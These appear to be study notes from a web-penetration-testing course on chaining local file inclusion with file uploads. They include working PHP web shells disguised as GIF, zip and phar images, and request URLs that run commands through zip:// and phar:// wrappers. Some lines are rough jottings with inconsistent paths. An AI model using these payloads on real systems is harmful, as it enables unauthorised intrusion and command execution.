Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well. We can do so as follows:

```shell-session
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
upload a php shell as image type: shell.gif
find out where its stored in server file system via LFI: and query it.
```
index.php?language=/user_images/shell.gif&cmd=id
```


#### Uploaded File Path

Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```
./profile_images/shell.gif&cmd=id
## Zip Upload

We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:

```shell-session
 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## PHAR upload
we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

LFI and File Uploads

```shell-session
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
**Note:** There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()).
